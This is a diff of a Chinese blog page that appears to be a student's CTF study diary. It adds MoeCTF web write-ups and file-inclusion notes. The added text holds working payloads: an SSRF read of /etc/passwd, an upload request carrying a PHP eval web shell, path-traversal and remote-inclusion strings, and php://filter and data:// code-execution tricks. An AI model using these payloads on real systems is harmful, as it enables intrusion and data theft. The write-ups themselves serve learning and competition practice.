@@ -381,14 +381,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    17.5k
+                    20.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    80 分
+                    93 分
                 </div>
                 
 
@@ -2228,18 +2228,18 @@ Base=fl@g<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>get</code>传参给<code>eval</code>执行，直接传<code>system(&#39;cat /flag&#39;);</code>，即<code>url?DT=system(&#39;cat /flag&#39;);</code></p>
-<h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><p>看了篇md5绕过的文章：<a target="_blank" rel="noopener" href="https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
-<h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><p><code>md5($str1) == md5($str2)</code></p>
+<h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><p>看了篇md5绕过的文章：<a target="_blank" rel="noopener" href="https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
+<h4 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h4><p><code>md5($str1) == md5($str2)</code></p>
 <p>原理：构造<code>MD5</code>值<code>0e</code>开头，弱类型比较是科学计数法,<code>0</code>的多少次方都是<code>0</code></p>
 <p>单次<code>md5</code>后<code>0e</code>开头：<code>QNKCDZO、240610708、s878926199a、s155964671a、s214587387a</code></p>
 <p>两次<code>md5</code>后<code>0e</code>开头：<code>CbDLytmyGm2xQyaLNhWn、770hQgrBOjrcqftrlaZk、7r4lGXCH2Ksu2JNT3BYM</code></p>
-<h3 id="强类型"><a href="#强类型" class="headerlink" title="强类型"></a>强类型</h3><p><code>md5($str1) === md5($str2)</code></p>
+<h4 id="强类型"><a href="#强类型" class="headerlink" title="强类型"></a>强类型</h4><p><code>md5($str1) === md5($str2)</code></p>
 <p>原理：<code>PHP</code>可以提交数组，<code>md5</code>或<code>sha1</code>传入数组返回值为<code>NULL</code></p>
 <p>传入方式：<code>$_GET[&#39;name&#39;]-&gt;name[]=1</code></p>
-<h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>使用<code>Fastcoll</code>：<a target="_blank" rel="noopener" href="http://hduyyds.top/tools/fastcoll.rar">http://hduyyds.top/tools/fastcoll.rar</a></p>
-<h3 id="绕过md5-来构造攻击语句"><a href="#绕过md5-来构造攻击语句" class="headerlink" title="绕过md5()来构造攻击语句"></a>绕过md5()来构造攻击语句</h3><p><code>ffifdyop</code>哈希后<code>ascii</code>字符串前几位是<code> or &#39;6</code>，拼接后变成<code>select * from ‘admin’ where password=’’ or ‘6xxxxx’</code>，永真</p>
+<h4 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h4><p>使用<code>Fastcoll</code>：<a target="_blank" rel="noopener" href="http://hduyyds.top/tools/fastcoll.rar">http://hduyyds.top/tools/fastcoll.rar</a></p>
+<h4 id="绕过md5-来构造攻击语句"><a href="#绕过md5-来构造攻击语句" class="headerlink" title="绕过md5()来构造攻击语句"></a>绕过md5()来构造攻击语句</h4><p><code>ffifdyop</code>哈希后<code>ascii</code>字符串前几位是<code> or &#39;6</code>，拼接后变成<code>select * from ‘admin’ where password=’’ or ‘6xxxxx’</code>，永真</p>
 <p>本题一次弱类型一次强类型，可以传入<code>get</code>参数：[<a target="_blank" rel="noopener" href="http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2%5B%5C%5D=1%5D(http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2%5B%5D=1)%EF%BC%8C%60post%60%E5%8F%82%E6%95%B0%60password=s878926199a&amp;password2%5B%5D=2%60">http://challenge.basectf.fun:39853?name=QNKCDZO&amp;name2[\]=1](http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2[]=1)，`post`参数`password=s878926199a&amp;password2[]=2`</a></p>
-<h2 id="web七龙珠"><a href="#web七龙珠" class="headerlink" title="web七龙珠"></a>web七龙珠</h2><p>访问：<code>/flag1ab.html</code>，查看源码得到<code>flag1：bW9lY3Rm</code></p>
+<h3 id="web七龙珠"><a href="#web七龙珠" class="headerlink" title="web七龙珠"></a>web七龙珠</h3><p>访问：<code>/flag1ab.html</code>，查看源码得到<code>flag1：bW9lY3Rm</code></p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--></span>
 <span class="token comment">&lt;!--flag1: bW9lY3Rm--></span>
 <span class="token comment">&lt;!--下一步：/flag2hh.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -2352,7 +2352,7 @@ b=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>访问<code>url?moe=Flag</code>并且添加一个<code>post</code>参数得到<code>flag6: rZV9VX2t</code></p>
 <p>访问<code>flag7fxxkfinal.php</code>，提示<code>eval($_POAT[&#39;what&#39;]);</code>，直接<code>post</code>参数<code>what=system(&#39;cat /flag7&#39;);</code>得到<code>rbm93X1dlQn0=</code></p>
 <p>连起来就是<code>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code>，再<code>base64</code>解码即可</p>
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul>
 <li><p><code>preg_match</code>用于执行正则表达式匹配的函数,在给定的字符串中搜索与正则表达式相匹配的内容，不区分大小写，可以改大小写绕过例如以下代码可以传入<code>?moe=/Flag/i</code>绕过</p>
 </li>
 <li><p><code>scandir(&quot;.&quot;)/glob</code> 列出当前目录中的所有文件和目录。</p>
@@ -2406,8 +2406,8 @@ b=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <li><p><code>gzdeflate() / gzinflate()</code>：压缩和解压缩数据，有时用于绕过长度限制。</p>
 </li>
 </ul>
-<h2 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h2><p>救命两个月前才考的计网，放个假全忘了…还好我不考研（bushi</p>
-<h3 id="计网前置知识"><a href="#计网前置知识" class="headerlink" title="计网前置知识"></a>计网前置知识</h3><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><ul>
+<h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>救命两个月前才考的计网，放个假全忘了…还好我不考研（bushi</p>
+<h4 id="计网前置知识"><a href="#计网前置知识" class="headerlink" title="计网前置知识"></a>计网前置知识</h4><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><ul>
 <li>前缀：计算机所属物理网络，每个物理网络都有唯一网络号，根据网络号划分五类地址<ul>
 <li>A类：<code>0.0.0.0~127.255.255.255</code></li>
 <li>B类：<code>128.0.0.0~191.255.255.255</code></li>
@@ -2419,7 +2419,7 @@ b=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 </li>
 <li>后缀：确定该网络中的唯一一台计算机</li>
 </ul>
-<h4 id="OSI七层模型和TCP-x2F-IP协议结构层次"><a href="#OSI七层模型和TCP-x2F-IP协议结构层次" class="headerlink" title="OSI七层模型和TCP&#x2F;IP协议结构层次"></a>OSI七层模型和TCP&#x2F;IP协议结构层次</h4><table>
+<h5 id="OSI七层模型和TCP-x2F-IP协议结构层次"><a href="#OSI七层模型和TCP-x2F-IP协议结构层次" class="headerlink" title="OSI七层模型和TCP&#x2F;IP协议结构层次"></a>OSI七层模型和TCP&#x2F;IP协议结构层次</h5><table>
 <thead>
 <tr>
 <th>OSI七层网络模型</th>
@@ -2463,8 +2463,8 @@ b=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <td>IEEE 802.1A, IEEE 802.2到IEEE 802.11</td>
 </tr>
 </tbody></table>
-<h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>用于标识通信的应用程序，将进程与端口绑定，范围在<code>0~65535</code>，<code>0~256</code>是系统保留端口，其余为自由端口</p>
-<h3 id="套接字编程"><a href="#套接字编程" class="headerlink" title="套接字编程"></a>套接字编程</h3><p>套接字是一个指向传输提供者的句柄，分为三类</p>
+<h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><p>用于标识通信的应用程序，将进程与端口绑定，范围在<code>0~65535</code>，<code>0~256</code>是系统保留端口，其余为自由端口</p>
+<h4 id="套接字编程"><a href="#套接字编程" class="headerlink" title="套接字编程"></a>套接字编程</h4><p>套接字是一个指向传输提供者的句柄，分为三类</p>
 <ul>
 <li>原始套接字：让程序开发人员能够控制底层网络传输机制，接收的数据包含<code>IP</code>头</li>
 <li>流式套接字：提供双向、有序、可靠的数据传输服务，通信前需要双方建立连接，例如<code>TCP</code>协议</li>
@@ -2807,6 +2807,259 @@ r<span class="token punctuation">.</span>sendlineafter<span class="token punctua
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="8-18"><a href="#8-18" class="headerlink" title="#8.18"></a>#8.18</h2><p>搞招新的文案什么的</p>
+<h2 id="8-19"><a href="#8-19" class="headerlink" title="#8.19"></a>#8.19</h2><p>学了点<code>web</code>写了点题，继续逆向看了几个小时还是没有一点头绪</p>
+<h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h3><p>给了源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$image_info</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mime_type</span> <span class="token operator">=</span> <span class="token variable">$image_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: '</span> <span class="token operator">.</span> <span class="token variable">$mime_type</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>file伪协议：<code>http://127.0.0.1:64686/index.php?url=file:///etc/passwd</code>得到</p>
+<pre class="line-numbers language-none"><code class="language-none">Warning: Trying to access array offset on false in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 13
+
+Warning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:13) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 15
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin www-data:x:1000:1000:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin nginx:x:100:101:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin moectf&#123;I_aM_v3Ry_sOrry-4BouT-tHisa0c9f6f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h3><p>可以执行系统命令，提示查看环境变量，输入<code>env</code>得到环境变量里的<code>flag</code></p>
+<p><code>FLAG=moectf&#123;wElcoME_t0_MOeCtf-AND-Ro4DI-5TArTup-BY-sxRhhh134&#125;</code></p>
+<h3 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h3><p>文件上传一个木马，然后执行<code>env</code>，环境变量里有<code>flag</code></p>
+<p><code>FLAG=moectf&#123;uPloAd-your_P4yI0Ad_And_D0-Wh@t_yoUr_w@ntdb5&#125;</code></p>
+<h3 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h3><p>前端判断后缀是图片，木马改后缀为<code>jpg</code>选择文件，再抓包改<code>php</code>上传文件</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/upload.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:64517</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">213</span></span>
+<span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="119", "Not?A_Brand";v="24"</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarylCRALsDMbQvs1tSq</span></span>
+<span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span>
+<span class="token header"><span class="token header-name keyword">sec-ch-ua-mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">sec-ch-ua-platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span>
+<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:64517</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">cors</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">empty</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:64517/</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+
+------WebKitFormBoundarylCRALsDMbQvs1tSq
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="image"; filename="test.php"</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span>
+
+&lt;?php @eval($_POST['pass']);?>
+------WebKitFormBoundarylCRALsDMbQvs1tSq--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><code>PHP</code>：<code>include</code> &#x2F; <code>require</code> &#x2F; <code>include_once</code> &#x2F; <code>require_once</code></p>
+<p><code>JSP Servlet</code>：<code>ava.io.File()</code> &#x2F; <code>java.io.FileReader()</code> </p>
+<p><code>ASP</code>：<code>includefile</code> &#x2F; <code>includevirtual</code></p>
+<p>当<code>PHP</code>包含一个文件时，会将该文件当做<code>PHP</code>代码执行，而不会在意文件什么类型</p>
+<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p><code>Local File Inclusion，LFI</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'/home/wwwrun/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>%00</code>截断(<code>PHP&lt;5.3.4 &amp; magic_quotes_gpc=off</code>)：<code>?file=../../../../../../../../../etc/passwd%00</code></p>
+<p>路径长度截断：<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code>在<code>Linux</code>中文件名长度<code>&gt;4096</code>，<code>Windows</code>中文件名长度<code>&gt;256</code></p>
+<p>点号截断：<code>?file=../../../../../../../../../boot.ini/………[…]…………</code>，仅适用于<code>Windows</code>，点号长度<code>&gt;256</code></p>
+<p>常见读取路径</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache2&#x2F;*	#Apache配置文件，可以获知Web目录、服务端口等信息
+&#x2F;etc&#x2F;nginx&#x2F;*	#Nginx配置文件，可以获知Web目录、服务端口等信息
+&#x2F;etc&#x2F;crontab	#定时任务文件
+&#x2F;etc&#x2F;environment	#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况
+&#x2F;etc&#x2F;hostname	#主机名
+&#x2F;etc&#x2F;hosts	#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP&#x2F;域名
+&#x2F;etc&#x2F;issue	#系统版本信息
+&#x2F;etc&#x2F;mysql&#x2F;*	#MYSQL配置文件
+&#x2F;etc&#x2F;php&#x2F;*	#PHP配置文件
+&#x2F;proc 目录	#&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需&#x2F;proc&#x2F;self代替&#x2F;proc&#x2F;[pid]即可
+&#x2F;proc&#x2F;[pid]&#x2F;cmdline	#cmdline可读出比较敏感的信息
+ssh &#96;&lt;?php phpinfo(); ?&gt;&#96;@192.168.1.1
+&#x2F;var&#x2F;log&#x2F;auth.log# apache日志
+# ssh日志，攻击方法
+&#x2F;var&#x2F;log&#x2F;apache2&#x2F;[access.log|error.log]	# apache日志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>Session</code>：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><code>Remote File Inclusion, RFI</code>，前提<code>allow_url_fopen = On</code> 是否允许打开远程文件<code>allow_url_include = On</code> 是否允许<code>include/require</code>远程文件</p>
+<ul>
+<li><p>普通远程文件包含：<code>?file=[http|https|ftp]://example.com/shell.txt</code>需要<code>allow_url_fopen=On &amp; allow_url_include=On</code></p>
+</li>
+<li><p><code>php / data</code>协议</p>
+</li>
+<li><p>限制包含文件的后缀名(<code>&lt;?php **include**($_GET[&#39;filename&#39;] . &quot;.no&quot;); ?&gt;</code>)，用<code>?</code>或<code>#</code>绕过（<code>?filename=http://xxxx/php.txt?</code> &#x2F; <code>?filename=http://xxxx/php.txt%23</code>)</p>
+</li>
+<li><p>利用<code>XSS</code>执行：<code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code>，需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个<code>XSS</code>漏洞，包含这个页面，就可以注入恶意代码了</p>
+</li>
+</ul>
+<h4 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>访问各个输入&#x2F;输出流，常见函数<code>file_get_contents / file_put_contents / readfile / fopen / file / show_source / highlight_file</code></p>
+<ul>
+<li><p><strong><code>php://input</code></strong></p>
+<p>访问<code>POST data</code>数据中的代码，开启<code>enable_post_data_reading</code>时不可用，必须开启<code>allow_url_include</code></p>
+<p>有**<code>file_put_contents</code>**时可以直接写入一句话木马<code>&lt;?php @eval($_POST[cmd]);</code></p>
+</li>
+<li><p><strong><code>php://filter</code></strong></p>
+<p><code>PHP&gt;=5.0.0</code>，用于数据流打开时筛选过滤，题目中出现函数<code>readfile、file、file_get_contents</code>可用，需要<code>allow_url_include=On</code></p>
+<ul>
+<li><p>参数</p>
+<p><code>resource=要过滤的数据流</code></p>
+<p><code>read=读链的筛选列表 、write=写链的筛选列表</code>：可以设定多个<code>|</code>分隔，有<code>file_put_contents</code>时可以用<code>write</code></p>
+<p><code>;两个链的筛选列表</code>：没有<code>read</code>和<code>write</code>时视情况用于读&#x2F;写</p>
+</li>
+<li><p>过滤器：<code>filter</code>不指定过滤器会默认解析<code>PHP</code>代码，非代码需要进行编码</p>
+<p><code>string.rot13</code>：等同于<code>str_rot13()</code>，<code>rot13</code>变换</p>
+<p><code>convert.base64-encode</code></p>
+<p><code>convert.base64-decode</code>：解码按照<code>4</code>位一组，不是<code>4</code>的倍数需要在字符串前补上字母</p>
+<p><code>convert.quoted-printable-encode</code>：<code>quoted-printable</code>字符串与<code>8-bit</code>字符串编码</p>
+<p><code>convert.quoted-printable-decode</code>:<code>quoted-printable</code>字符串与<code>8-bit</code>字符串解码</p>
+</li>
+<li><p>用法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php://filter/resource=flag.php	#直接读，PHP代码会被解析
+php://filter/read=convert.base64-encode/resource=flag.php
+
+php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php		#base64和rot13被过滤，使用其他编码，ucs-2编码的字符串位数一定要是偶数，ucs-4编码的字符串位数一定要是 4 的倍数，输入的内容也要先进行编码，例如：
+file_put_contents($file, "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$contents);
+GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
+POST: contents=?&lt;hp pystsme"(ac tlf"*;)
+#获取编码后的内容
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UCS-2LE"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"UCS-2BE"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php system("cat fl*");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+php<span class="token punctuation">:</span><span class="token comment">//filter/string.rot13/resource=1.php	#rot13</span>
+<span class="token comment">#编码可以用于绕过执行代码中多余的die部分，例如file_put_contents(urldecode($file), "&lt;?php die('大佬别秀了');</span><span class="token delimiter important">?></span></span>".$content);
+php://input		#data部分：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+<li><p>**<code>php://output</code>**：只写的数据流，允许以<code>echo</code>一样的方式写入到输出缓冲区</p>
+</li>
+<li><p>**<code>php://fd</code>**：<code>PHP&gt;=5.3.6</code>允许直接访问指定的文件描述符，如<code>php://fd/3</code></p>
+</li>
+<li><p>**<code>php://memory / php://temp</code>**：<code>PHP&gt;=5.1.0</code> <code>memory</code>将数据存储在内存，<code>temp</code>在内存量达到预定义限制后存入临时文件，可通过<code>/mmaxmemory:xx</code>限制最大数据量</p>
+</li>
+</ul>
+<h4 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>条件：<code>PHP&gt;=5.2.0</code>，用于传递相应格式的数据，通常可以用来执行<code>PHP</code>代码，推荐使用<code>base64</code>编码传参，需要<code>allow_url_include=On</code></p>
+<p>绕过<code>file_get_contents</code>：<code>fn=data://text/plain,bugku</code></p>
+<p><code>base64</code>过简单过滤：<code>fn=data://text/plain;base64,YnVna3U=</code></p>
+<p>执行代码：<code>data://text/plain,&lt;?php phpinfo();</code></p>
